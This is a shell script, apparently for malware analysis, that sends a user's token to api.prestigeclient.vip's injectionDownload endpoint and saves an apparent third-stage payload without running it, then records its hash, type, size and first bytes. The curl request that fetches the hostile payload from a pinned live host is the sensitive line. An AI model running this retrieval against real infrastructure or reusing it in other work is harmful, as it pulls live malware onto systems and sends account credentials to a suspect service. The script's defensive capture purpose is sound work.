#!/bin/sh
set -eu

# Defensive capture only. This script downloads bytes and never executes them.
# Run inside the user's Whonix/isolated analysis environment.

umask 077
capture_dir="${HOME}/prestige-third-stage-capture"
mkdir -p "$capture_dir"
cd "$capture_dir"

for required_cmd in curl python3 sha256sum file stat od stty; do
    command -v "$required_cmd" >/dev/null 2>&1 || {
        echo "Missing required command: $required_cmd" >&2
        exit 1
    }
done

if [ ! -t 0 ]; then
    echo 'Refusing non-interactive input; enter the token only from a private terminal.' >&2
    exit 1
fi

old_tty_settings=$(stty -g)
trap 'stty "$old_tty_settings"' 0 1 2 15
stty -echo
printf 'Prestige account token (input hidden; never paste it into chat): ' >&2
IFS= read -r prestige_token
stty "$old_tty_settings"
trap - 0 1 2 15
printf '\n' >&2

if [ -z "$prestige_token" ]; then
    echo 'Empty token; stopping without a request.' >&2
    exit 1
fi

# The token travels over stdin, not in curl's command-line arguments. Do not
# enable shell tracing (set -x), packet capture decryption, or verbose curl.
printf '%s' "$prestige_token" |
python3 -c 'import json, sys; print(json.dumps({"token": sys.stdin.read()}), end="")' |
curl \
  --silent --show-error \
  --connect-timeout 10 \
  --max-time 60 \
  --proto '=https' \
  --tlsv1.2 \
  --resolve 'api.prestigeclient.vip:443:172.67.137.182' \
  -H 'Content-Type: application/json' \
  -H 'User-Agent:' \
  --data-binary @- \
  --dump-header response.headers \
  --output third-stage.bin \
  --write-out 'http_code=%{http_code}\ncontent_type=%{content_type}\nsize=%{size_download}\nremote_ip=%{remote_ip}\n' \
  'https://api.prestigeclient.vip/injectionDownload' \
  > response.meta

unset prestige_token

sha256sum third-stage.bin > third-stage.sha256
file -b third-stage.bin > third-stage.filetype
stat -c 'size=%s bytes' third-stage.bin > third-stage.size
od -An -tx1 -N32 third-stage.bin > third-stage.first32

echo 'Capture complete. Review response.meta before moving the file.'
echo 'Do not execute third-stage.bin. Share only the archive/file through the agreed analysis channel; never share the token.'
